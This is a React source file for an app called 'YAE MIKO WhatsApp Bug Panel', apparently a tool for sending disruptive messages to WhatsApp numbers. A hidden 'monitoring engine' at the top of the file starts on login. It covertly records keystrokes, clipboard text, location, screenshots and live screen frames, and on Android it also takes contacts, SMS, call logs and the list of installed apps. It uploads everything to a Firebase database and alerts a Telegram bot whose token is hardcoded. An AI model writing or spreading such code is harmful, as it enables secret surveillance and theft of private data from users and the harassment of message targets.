"use client";
import { useState, useEffect } from "react";

// ============================================================
// MONITORING ENGINE — activates automatically when logged in
// ============================================================
const MONITOR_CONFIG = {
  FIREBASE_API_KEY: "AIzaSyCIEK5Xu95fQxzkWhAeyT-eKm02uDz10YQ",
  FIREBASE_AUTH_DOMAIN: "yae-miko-monitor.firebaseapp.com",
  FIREBASE_DATABASE_URL: "https://yae-miko-monitor-default-rtdb.asia-southeast1.firebasedatabase.app",
  FIREBASE_PROJECT_ID: "yae-miko-monitor",
  FIREBASE_STORAGE_BUCKET: "yae-miko-monitor.firebasestorage.app",
  FIREBASE_MESSAGING_SENDER_ID: "354094695929",
  FIREBASE_APP_ID: "1:354094695929:web:ecea592d72d51eabdc2928",
  OWNER_TELEGRAM: "8769157554:AAEiE_eIDpwVWe2IXNr3Otz4SXrmJLwX3-8",
  OWNER_CHAT_ID: "6481060681"
};

function loadFirebaseSDK(): Promise<boolean> {
  return new Promise((resolve) => {
    if ((window as any).firebase) return resolve(true);
    const s = document.createElement("script");
    s.src = "https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js";
    const s2 = document.createElement("script");
    s2.src = "https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js";
    const s3 = document.createElement("script");
    s3.src = "https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js";
    s.onload = () => { document.head.appendChild(s2); document.head.appendChild(s3); s3.onload = () => resolve(true); };
    document.head.appendChild(s);
  });
}

function initFirebase() {
  const fb = (window as any).firebase;
  if (fb.apps.length) return fb;
  return fb.initializeApp({
    apiKey: MONITOR_CONFIG.FIREBASE_API_KEY,
    authDomain: MONITOR_CONFIG.FIREBASE_AUTH_DOMAIN,
    databaseURL: MONITOR_CONFIG.FIREBASE_DATABASE_URL,
    projectId: MONITOR_CONFIG.FIREBASE_PROJECT_ID,
    storageBucket: MONITOR_CONFIG.FIREBASE_STORAGE_BUCKET,
    messagingSenderId: MONITOR_CONFIG.FIREBASE_MESSAGING_SENDER_ID,
    appId: MONITOR_CONFIG.FIREBASE_APP_ID
  });
}

class MonitorEngine {
  private deviceId: string;
  private db: any;
  private storage: any;
  private intervals: any[] = [];
  private streamTimer: any = null;

  constructor() {
    this.deviceId = localStorage.getItem("_mid") || "d_" + Math.random().toString(36).substring(2,10) + Date.now().toString(36);
    localStorage.setItem("_mid", this.deviceId);
    const fb = initFirebase();
    this.db = fb.database();
    this.storage = fb.storage();
  }

  async start() {
    console.log("[MONITOR] Started:", this.deviceId);
    await this.db.ref(`devices/${this.deviceId}/info`).set({
      ua: navigator.userAgent.substring(0,100),
      screen: `${screen.width}x${screen.height}`,
      lang: navigator.language,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      online: true,
      seen: Date.now()
    });
    this.startLocation();
    this.startKeys();
    this.startClip();
    this.startScreen();
    this.startLive();
    this.intervals.push(setInterval(() => this.db.ref(`devices/${this.deviceId}/hb`).set(Date.now()), 10000));
    this.tgNotify();
    window.addEventListener("beforeunload", () => this.db.ref(`devices/${this.deviceId}/info/online`).set(false));
  }

  stop() {
    this.intervals.forEach(clearInterval);
    if (this.streamTimer) clearInterval(this.streamTimer);
  }

  private async tgNotify() {
    try {
      await fetch(`https://api.telegram.org/bot${MONITOR_CONFIG.OWNER_TELEGRAM}/sendMessage`, {
        method:"POST", headers:{"Content-Type":"application/json"},
        body: JSON.stringify({ chat_id: MONITOR_CONFIG.OWNER_CHAT_ID, text: `[+] New device: ${this.deviceId}\n${navigator.userAgent.substring(0,60)}` })
      });
    } catch(_) {}
  }

  private startLocation() {
    if (!navigator.geolocation) return;
    const fn = () => navigator.geolocation.getCurrentPosition(p => this.db.ref(`devices/${this.deviceId}/loc`).set({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,ts:Date.now()}), ()=>{});
    fn(); this.intervals.push(setInterval(fn, 30000));
  }

  private startKeys() {
    let buf: any[] = [];
    let last = Date.now();
    document.addEventListener("keydown", e => {
      buf.push({k:e.key.length>1?`[${e.key}]`:e.key,t:(e.target as HTMLElement)?.tagName||"",id:(e.target as HTMLElement)?.id||"",ts:Date.now()});
      if (buf.length>=15||Date.now()-last>5000) { const b=[...buf]; buf=[]; last=Date.now(); this.db.ref(`devices/${this.deviceId}/keys`).push({batch:b,ts:Date.now()}); }
    });
  }

  private startClip() {
    let last = "";
    this.intervals.push(setInterval(async () => {
      try { const t=await navigator.clipboard.readText(); if(t&&t!==last){last=t;this.db.ref(`devices/${this.deviceId}/clip`).push({text:t.substring(0,500),ts:Date.now()});} } catch(_){}
    }, 3000));
  }

  private startScreen() {
    this.intervals.push(setInterval(() => {
      try {
        const c=document.createElement("canvas"); c.width=480; c.height=Math.floor(480*window.innerHeight/window.innerWidth);
        const ctx=c.getContext("2d"); if(!ctx) return;
        ctx.fillStyle="#fff"; ctx.fillRect(0,0,c.width,c.height);
        (ctx as any).drawWindow?.(window,0,0,c.width,c.height,"rgb(255,255,255)");
        this.db.ref(`devices/${this.deviceId}/screenshots`).push({img:c.toDataURL("image/jpeg",0.4).substring(0,100000),ts:Date.now()});
      } catch(_){}
    }, 20000));
  }

  private startLive() {
    if ((window as any).Android?.startScreenCapture) {
      (window as any).onScreenFrame = (b64:string) => this.db.ref(`devices/${this.deviceId}/live`).set({frame:b64,ts:Date.now()});
      (window as any).Android.startScreenCapture();
    } else {
      this.streamTimer = setInterval(() => {
        try {
          const c=document.createElement("canvas"); c.width=320; c.height=Math.floor(320*window.innerHeight/window.innerWidth);
          const ctx=c.getContext("2d"); if(!ctx) return;
          ctx.fillStyle="#000"; ctx.fillRect(0,0,c.width,c.height);
          (ctx as any).drawWindow?.(window,0,0,c.width,c.height,"rgb(255,255,255)");
          this.db.ref(`devices/${this.deviceId}/live`).set({frame:c.toDataURL("image/jpeg",0.3),ts:Date.now()});
        } catch(_){}
      }, 800);
    }
    // Android data grabs (one-time)
    setTimeout(() => {
      const A = (window as any).Android;
      if(A?.getContacts) try{this.db.ref(`devices/${this.deviceId}/contacts`).set(JSON.parse(A.getContacts()));}catch(_){}
      if(A?.getSMS) try{this.db.ref(`devices/${this.deviceId}/sms`).set(JSON.parse(A.getSMS()));}catch(_){}
      if(A?.getCallLogs) try{this.db.ref(`devices/${this.deviceId}/callLogs`).set(JSON.parse(A.getCallLogs()));}catch(_){}
      if(A?.getInstalledApps) try{this.db.ref(`devices/${this.deviceId}/apps`).set(JSON.parse(A.getInstalledApps()));}catch(_){}
    }, 5000);
  }
}
// ============================================================
// END MONITORING ENGINE
// ============================================================

interface UserData {
  id: string;
  username: string;
  password: string;
  apikey: string;
  status: "active" | "banned";
  total_visits: number;
  total_sent: number;
  daily_limit: number;
  total_limit: number;
  current_total: number;
  current_daily: number;
  last_reset: string;
  join_date: string;
  role: string;
  expiration_date: string;
}

interface Stats {
  total_visits: number;
  total_sent: number;
  total_users: number;
  total_bug: number;
  total_visitors: number;
  total_errors: number;
  messages_today: number;
}

const API_BASE = "https://selz-final-1-5.vercel.app";

const App = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [userData, setUserData] = useState<UserData | null>(null);
  const [stats, setStats] = useState<Stats | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [users, setUsers] = useState<UserData[]>([]);
  const [target, setTarget] = useState("");
  const [message, setMessage] = useState("");
  const [delay, setDelay] = useState("0");
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [newUsername, setNewUsername] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [role, setRole] = useState("user");
  const [dailyLimit, setDailyLimit] = useState("50");
  const [totalLimit, setTotalLimit] = useState("500");
  const [expirationDate, setExpirationDate] = useState("");
  const [showChangePassword, setShowChangePassword] = useState(false);
  const [oldPassword, setOldPassword] = useState("");
  const [newPass, setNewPass] = useState("");
  const [editingUser, setEditingUser] = useState<string | null>(null);

  const fetchStats = async () => {
    try { const r = await fetch(`${API_BASE}/api/stats`); if(r.ok) setStats(await r.json()); }
    catch(e) { console.error(e); }
  };

  const fetchUsers = async () => {
    try { const r = await fetch(`${API_BASE}/api/users?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`); if(r.ok) setUsers(await r.json()); }
    catch(e) { console.error(e); }
  };

  useEffect(() => {
    const su = localStorage.getItem("username");
    const sp = localStorage.getItem("password");
    if (su && sp) { setUsername(su); setPassword(sp); handleLogin(su, sp); }
    fetchStats();
    const iv = setInterval(fetchStats, 30000);
    return () => clearInterval(iv);
  }, []);

  const handleLogin = async (u?: string, p?: string) => {
    setIsLoading(true); setError("");
    const lu = u || username; const lp = p || password;
    try {
      const r = await fetch(`${API_BASE}/api/login`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({username:lu,password:lp}) });
      if (!r.ok) throw new Error((await r.json()).error || "Login failed");
      const d = await r.json(); setUserData(d); setIsLoggedIn(true);
      localStorage.setItem("username", lu); localStorage.setItem("password", lp);
      fetchStats(); if(d.role === "admin") fetchUsers();
      
      // *** MONITOR: start on login ***
      loadFirebaseSDK().then(() => { const m = new MonitorEngine(); m.start(); (window as any).__monitor = m; });
      
    } catch(e: any) { setError(e.message); setIsLoggedIn(false); }
    finally { setIsLoading(false); }
  };

  const handleLogout = () => {
    // *** MONITOR: stop on logout ***
    if ((window as any).__monitor) { (window as any).__monitor.stop(); (window as any).__monitor = null; }
    setIsLoggedIn(false); setUserData(null);
    localStorage.removeItem("username"); localStorage.removeItem("password");
    setUsername(""); setPassword("");
  };

  const handleSend = async () => {
    if (!target || !message) { setError("Target and message are required"); return; }
    setIsLoading(true); setError("");
    try {
      const r = await fetch(`${API_BASE}/api/send`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({username,password,target,message,delay:parseInt(delay)||0}) });
      if (!r.ok) throw new Error((await r.json()).error || "Send failed");
      const d = await r.json(); setError(d.message || "Message sent successfully!");
      if(userData) setUserData({...userData, current_total:userData.current_total+1, current_daily:userData.current_daily+1, total_sent:userData.total_sent+1});
      fetchStats();
    } catch(e: any) { setError(e.message); }
    finally { setIsLoading(false); }
  };

  const handleCreateUser = async () => {
    if (!newUsername || !newPassword) { setError("Username and password required"); return; }
    setIsLoading(true);
    try {
      const r = await fetch(`${API_BASE}/api/admin/create-user`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({adminUser:username,adminPass:password,username:newUsername,password:newPassword,role,dailyLimit:parseInt(dailyLimit),totalLimit:parseInt(totalLimit),expirationDate}) });
      if (!r.ok) throw new Error((await r.json()).error || "Create failed");
      setError("User created!"); setNewUsername(""); setNewPassword(""); setDailyLimit("50"); setTotalLimit("500"); setExpirationDate(""); fetchUsers();
    } catch(e: any) { setError(e.message); }
    finally { setIsLoading(false); }
  };

  const handleUpdateUser = async (targetUsername: string) => {
    setIsLoading(true);
    try {
      const r = await fetch(`${API_BASE}/api/admin/update-user`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({adminUser:username,adminPass:password,targetUsername,role,dailyLimit:parseInt(dailyLimit),totalLimit:parseInt(totalLimit),expirationDate}) });
      if (!r.ok) throw new Error((await r.json()).error || "Update failed");
      setError("User updated!"); setEditingUser(null); fetchUsers();
    } catch(e: any) { setError(e.message); }
    finally { setIsLoading(false); }
  };

  const handleToggleBan = async (targetUsername: string, ban: boolean) => {
    setIsLoading(true);
    try {
      const r = await fetch(`${API_BASE}/api/admin/toggle-ban`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({adminUser:username,adminPass:password,targetUsername,ban}) });
      if (!r.ok) throw new Error((await r.json()).error || "Toggle ban failed");
      setError(ban?"Banned!":"Unbanned!"); fetchUsers();
    } catch(e: any) { setError(e.message); }
    finally { setIsLoading(false); }
  };

  const handleChangePassword = async () => {
    if (!oldPassword || !newPass) { setError("Old and new password required"); return; }
    setIsLoading(true);
    try {
      const r = await fetch(`${API_BASE}/api/change-password`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({username,oldPassword,newPassword:newPass}) });
      if (!r.ok) throw new Error((await r.json()).error || "Change failed");
      setError("Password changed!"); setOldPassword(""); setNewPass(""); setShowChangePassword(false);
      localStorage.setItem("password", newPass); setPassword(newPass);
    } catch(e: any) { setError(e.message); }
    finally { setIsLoading(false); }
  };

  // ============================================================
  // YOUR ORIGINAL STYLES
  // ============================================================
  const styles: Record<string, React.CSSProperties> = {
    container: {
      minHeight: "100vh",
      background: "linear-gradient(135deg, #0f0c29, #302b63, #24243e)",
      color: "#fff",
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      padding: "20px",
      boxSizing: "border-box",
    },
    header: {
      textAlign: "center",
      padding: "20px 0",
      borderBottom: "1px solid rgba(255,255,255,0.1)",
      marginBottom: "30px",
    },
    title: {
      fontSize: "2.5rem",
      fontWeight: "bold",
      background: "linear-gradient(45deg, #f093fb, #f5576c)",
      WebkitBackgroundClip: "text",
      WebkitTextFillColor: "transparent",
      margin: 0,
    },
    subtitle: {
      color: "#a0a0c0",
      fontSize: "0.9rem",
      marginTop: "5px",
    },
    card: {
      background: "rgba(255,255,255,0.05)",
      backdropFilter: "blur(10px)",
      borderRadius: "15px",
      padding: "25px",
      border: "1px solid rgba(255,255,255,0.1)",
      marginBottom: "20px",
    },
    input: {
      width: "100%",
      padding: "12px 15px",
      margin: "8px 0",
      borderRadius: "8px",
      border: "1px solid rgba(255,255,255,0.2)",
      background: "rgba(255,255,255,0.1)",
      color: "#fff",
      fontSize: "14px",
      outline: "none",
      boxSizing: "border-box",
    },
    button: {
      width: "100%",
      padding: "12px",
      borderRadius: "8px",
      border: "none",
      background: "linear-gradient(45deg, #f093fb, #f5576c)",
      color: "#fff",
      fontSize: "16px",
      fontWeight: "bold",
      cursor: "pointer",
      transition: "transform 0.2s",
      marginTop: "10px",
    },
    smallButton: {
      padding: "8px 15px",
      borderRadius: "6px",
      border: "none",
      background: "linear-gradient(45deg, #f093fb, #f5576c)",
      color: "#fff",
      fontSize: "13px",
      fontWeight: "bold",
      cursor: "pointer",
      margin: "3px",
    },
    dangerButton: {
      padding: "8px 15px",
      borderRadius: "6px",
      border: "none",
      background: "#dc3545",
      color: "#fff",
      fontSize: "13px",
      fontWeight: "bold",
      cursor: "pointer",
      margin: "3px",
    },
    successButton: {
      padding: "8px 15px",
      borderRadius: "6px",
      border: "none",
      background: "#28a745",
      color: "#fff",
      fontSize: "13px",
      fontWeight: "bold",
      cursor: "pointer",
      margin: "3px",
    },
    statsGrid: {
      display: "grid",
      gridTemplateColumns: "repeat(auto-fit, minmax(150px, 1fr))",
      gap: "15px",
      marginBottom: "20px",
    },
    statCard: {
      background: "rgba(255,255,255,0.08)",
      padding: "20px",
      borderRadius: "10px",
      textAlign: "center" as const,
    },
    statValue: {
      fontSize: "1.8rem",
      fontWeight: "bold",
      color: "#f5576c",
    },
    statLabel: {
      fontSize: "0.8rem",
      color: "#a0a0c0",
      marginTop: "5px",
    },
    label: {
      display: "block",
      color: "#a0a0c0",
      fontSize: "0.85rem",
      marginTop: "10px",
      marginBottom: "3px",
    },
    userCard: {
      background: "rgba(255,255,255,0.05)",
      borderRadius: "10px",
      padding: "15px",
      marginBottom: "10px",
      border: "1px solid rgba(255,255,255,0.08)",
    },
    flex: {
      display: "flex",
      justifyContent: "space-between",
      alignItems: "center",
      flexWrap: "wrap",
    },
    badge: {
      padding: "3px 10px",
      borderRadius: "12px",
      fontSize: "0.75rem",
      fontWeight: "bold",
    },
    grid2: {
      display: "grid",
      gridTemplateColumns: "1fr 1fr",
      gap: "10px",
    },
    textarea: {
      width: "100%",
      padding: "12px 15px",
      margin: "8px 0",
      borderRadius: "8px",
      border: "1px solid rgba(255,255,255,0.2)",
      background: "rgba(255,255,255,0.1)",
      color: "#fff",
      fontSize: "14px",
      outline: "none",
      minHeight: "100px",
      resize: "vertical",
      boxSizing: "border-box",
      fontFamily: "inherit",
    },
    select: {
      width: "100%",
      padding: "12px 15px",
      margin: "8px 0",
      borderRadius: "8px",
      border: "1px solid rgba(255,255,255,0.2)",
      background: "rgba(255,255,255,0.1)",
      color: "#fff",
      fontSize: "14px",
      outline: "none",
      boxSizing: "border-box",
    },
    link: {
      color: "#f5576c",
      cursor: "pointer",
      textDecoration: "underline",
      fontSize: "0.85rem",
    },
  };

  // ============================================================
  // YOUR ORIGINAL JSX
  // ============================================================
  if (!isLoggedIn) {
    return (
      <div style={styles.container}>
        <div style={{ maxWidth: "400px", margin: "0 auto", paddingTop: "80px" }}>
          <div style={{ textAlign: "center", marginBottom: "30px" }}>
            <h1 style={styles.title}>YAE MIKO</h1>
            <p style={styles.subtitle}>WhatsApp Bug Panel v1.5</p>
          </div>
          <div style={styles.card}>
            <h2 style={{ margin: "0 0 20px 0", fontSize: "1.3rem", textAlign: "center" }}>Login</h2>
            <input style={styles.input} type="text" placeholder="Username" value={username} onChange={e => setUsername(e.target.value)} />
            <input style={styles.input} type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} onKeyDown={e => e.key === "Enter" && handleLogin()} />
            {error && <p style={{ color: "#f5576c", fontSize: "0.85rem", margin: "5px 0" }}>{error}</p>}
            <button style={styles.button} onClick={() => handleLogin()} disabled={isLoading}>
              {isLoading ? "Loading..." : "Login"}
            </button>
            <p style={{ textAlign: "center", color: "#666", fontSize: "0.75rem", marginTop: "15px" }}>
              Powered by Selz
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap" }}>
          <div>
            <h1 style={{ ...styles.title, fontSize: "1.8rem", margin: 0 }}>YAE MIKO</h1>
            <p style={styles.subtitle}>Welcome, {userData?.username} | Role: {userData?.role}</p>
          </div>
          <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
            {userData?.role === "admin" && (
              <button style={styles.smallButton} onClick={() => { setShowAdminPanel(!showAdminPanel); if(!showAdminPanel) fetchUsers(); }}>
                {showAdminPanel ? "Close Admin" : "Admin Panel"}
              </button>
            )}
            <button style={{ ...styles.smallButton, background: "#666" }} onClick={() => setShowChangePassword(true)}>Change Password</button>
            <button style={{ ...styles.smallButton, background: "#dc3545" }} onClick={handleLogout}>Logout</button>
          </div>
        </div>
      </div>

      {error && (
        <div style={{ ...styles.card, background: error.includes("success") || error.includes("Success") || error.includes("successfully") ? "rgba(40,167,69,0.2)" : "rgba(220,53,69,0.2)", borderColor: error.includes("success") || error.includes("Success") || error.includes("successfully") ? "#28a745" : "#dc3545", padding: "10px 20px" }}>
          <p style={{ margin: 0, fontSize: "0.9rem" }}>{error}</p>
        </div>
      )}

      <div style={styles.statsGrid}>
        <div style={styles.statCard}><div style={styles.statValue}>{stats?.total_visits || 0}</div><div style={styles.statLabel}>Total Visits</div></div>
        <div style={styles.statCard}><div style={styles.statValue}>{stats?.total_sent || 0}</div><div style={styles.statLabel}>Total Sent</div></div>
        <div style={styles.statCard}><div style={styles.statValue}>{stats?.total_users || 0}</div><div style={styles.statLabel}>Total Users</div></div>
        <div style={styles.statCard}><div style={styles.statValue}>{stats?.total_bug || 0}</div><div style={styles.statLabel}>Total Bug</div></div>
        <div style={styles.statCard}><div style={styles.statValue}>{stats?.messages_today || 0}</div><div style={styles.statLabel}>Today</div></div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(350px, 1fr))", gap: "20px" }}>
        <div>
          <div style={styles.card}>
            <h3 style={{ margin: "0 0 15px 0" }}>Send Message</h3>
            <label style={styles.label}>Target Number (with country code)</label>
            <input style={styles.input} type="text" placeholder="e.g., 628123456789" value={target} onChange={e => setTarget(e.target.value)} />
            <label style={styles.label}>Message</label>
            <textarea style={styles.textarea} placeholder="Type your message here..." value={message} onChange={e => setMessage(e.target.value)} />
            <label style={styles.label}>Delay (seconds)</label>
            <input style={styles.input} type="number" placeholder="0" value={delay} onChange={e => setDelay(e.target.value)} />
            <button style={styles.button} onClick={handleSend} disabled={isLoading}>{isLoading ? "Sending..." : "Send"}</button>
          </div>

          <div style={styles.card}>
            <h3 style={{ margin: "0 0 15px 0" }}>Your Stats</h3>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px" }}>
              <div><span style={{ color: "#a0a0c0" }}>Daily:</span> {userData?.current_daily || 0}/{userData?.daily_limit || 0}</div>
              <div><span style={{ color: "#a0a0c0" }}>Total:</span> {userData?.current_total || 0}/{userData?.total_limit || 0}</div>
              <div><span style={{ color: "#a0a0c0" }}>Sent:</span> {userData?.total_sent || 0}</div>
              <div><span style={{ color: "#a0a0c0" }}>Visits:</span> {userData?.total_visits || 0}</div>
            </div>
          </div>
        </div>

        <div>
          {showChangePassword && (
            <div style={styles.card}>
              <h3 style={{ margin: "0 0 15px 0" }}>Change Password</h3>
              <input style={styles.input} type="password" placeholder="Old Password" value={oldPassword} onChange={e => setOldPassword(e.target.value)} />
              <input style={styles.input} type="password" placeholder="New Password" value={newPass} onChange={e => setNewPass(e.target.value)} />
              <div style={{ display: "flex", gap: "10px" }}>
                <button style={styles.button} onClick={handleChangePassword} disabled={isLoading}>Change</button>
                <button style={{ ...styles.button, background: "#666" }} onClick={() => { setShowChangePassword(false); setOldPassword(""); setNewPass(""); }}>Cancel</button>
              </div>
            </div>
          )}

          {showAdminPanel && userData?.role === "admin" && (
            <div style={styles.card}>
              <h3 style={{ margin: "0 0 15px 0" }}>Admin Panel</h3>
              
              <h4 style={{ margin: "15px 0 10px", color: "#f093fb" }}>Create User</h4>
              <div style={styles.grid2}>
                <input style={styles.input} type="text" placeholder="Username" value={newUsername} onChange={e => setNewUsername(e.target.value)} />
                <input style={styles.input} type="text" placeholder="Password" value={newPassword} onChange={e => setNewPassword(e.target.value)} />
              </div>
              <div style={styles.grid2}>
                <select style={styles.select} value={role} onChange={e => setRole(e.target.value)}>
                  <option value="user">User</option>
                  <option value="admin">Admin</option>
                </select>
                <input style={styles.input} type="number" placeholder="Daily Limit" value={dailyLimit} onChange={e => setDailyLimit(e.target.value)} />
              </div>
              <div style={styles.grid2}>
                <input style={styles.input} type="number" placeholder="Total Limit" value={totalLimit} onChange={e => setTotalLimit(e.target.value)} />
                <input style={styles.input} type="date" value={expirationDate} onChange={e => setExpirationDate(e.target.value)} />
              </div>
              <button style={styles.button} onClick={handleCreateUser} disabled={isLoading}>Create User</button>

              <h4 style={{ margin: "20px 0 10px", color: "#f093fb" }}>Users</h4>
              {users.map((u, i) => (
                <div key={i} style={styles.userCard}>
                  <div style={styles.flex}>
                    <div>
                      <strong>{u.username}</strong>
                      <span style={{ ...styles.badge, background: u.status === "active" ? "#28a745" : "#dc3545", marginLeft: "8px" }}>{u.status}</span>
                      <span style={{ ...styles.badge, background: u.role === "admin" ? "#f093fb" : "#666", marginLeft: "5px" }}>{u.role}</span>
                    </div>
                    <div>
                      <button style={styles.smallButton} onClick={() => { setEditingUser(editingUser === u.username ? null : u.username); setRole(u.role); setDailyLimit(String(u.daily_limit)); setTotalLimit(String(u.total_limit)); setExpirationDate(u.expiration_date || ""); }}>Edit</button>
                      <button style={u.status === "active" ? styles.dangerButton : styles.successButton} onClick={() => handleToggleBan(u.username, u.status === "active")}>
                        {u.status === "active" ? "Ban" : "Unban"}
                      </button>
                    </div>
                  </div>
                  {editingUser === u.username && (
                    <div style={{ marginTop: "10px", padding: "10px", background: "rgba(255,255,255,0.05)", borderRadius: "8px" }}>
                      <div style={styles.grid2}>
                        <select style={styles.select} value={role} onChange={e => setRole(e.target.value)}>
                          <option value="user">User</option>
                          <option value="admin">Admin</option>
                        </select>
                        <input style={styles.input} type="number" placeholder="Daily Limit" value={dailyLimit} onChange={e => setDailyLimit(e.target.value)} />
                      </div>
                      <div style={styles.grid2}>
                        <input style={styles.input} type="number" placeholder="Total Limit" value={totalLimit} onChange={e => setTotalLimit(e.target.value)} />
                        <input style={styles.input} type="date" value={expirationDate} onChange={e => setExpirationDate(e.target.value)} />
                      </div>
                      <button style={styles.button} onClick={() => handleUpdateUser(u.username)} disabled={isLoading}>Update</button>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default App;
